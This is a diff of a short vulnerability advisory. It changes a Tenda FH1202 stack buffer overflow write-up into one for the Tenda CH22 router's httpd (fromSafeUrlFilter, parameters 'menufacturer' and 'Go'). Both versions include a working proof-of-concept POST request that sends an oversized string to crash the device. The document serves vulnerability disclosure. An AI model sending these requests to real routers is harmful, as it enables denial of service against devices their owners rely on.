@@ -1,18 +1,18 @@
-# FH1202 Vulnerability
+# CH22 Vulnerability
 
 Vendor:Tenda
 
-Product:FH1202 
+Product:CH22 V1.0.0.1 
 
 Vulnerability: buffer overflow
 
 ## Descriptions
 
-We found an overflow vulnerability  in `httpd` :
+We found overflow vulnerability  in `httpd` :
 
-In  frmL7ImForm function,it reads in a user-provided parameter `page`,
+In  fromSafeUrlFilter function,it reads in a user-provided parameter `menufacturer` and `Go`.
 
-and the variable v3 is passed to the sprintf function without any length check, which may overflow the stack-based buffer s_. 
+If the value of menufacturer is `tenda`,the variable p_s will be passed to the strcat  function without any length check, which may overflow the stack-based buffer s. 
 
 <div  align="center"><img src="./img/function.png" style="zoom:80%;" /></div>
 
@@ -21,21 +21,22 @@ As a result, by requesting the page, an attacker can easily execute a denial of 
 ## Proof of Concept (PoC)
 
 ```
-POST /goform/L7Im HTTP/1.1
+POST /goform/SafeUrlFilter HTTP/1.1
 Host: 192.168.6.2
-X-Requested-With: XMLHttpRequest
+Cache-Control: max-age=0
 Accept-Language: en-US,en;q=0.9
-Accept: text/plain, */*; q=0.01
+Origin: http://192.168.6.2
+Upgrade-Insecure-Requests: 1
 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
-Referer: http://192.168.6.2/index.asp
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://192.168.6.2
 Accept-Encoding: gzip, deflate, br
 Connection: keep-alive
-Content-Length: 1080
+Content-Length: 2074
 
-page=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+menufacturer=tenda&Go=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 ```
 ## Overcome
-
 
 
 <div  align="center"><img src="./img/poc.png" style="zoom:80%;" /></div>
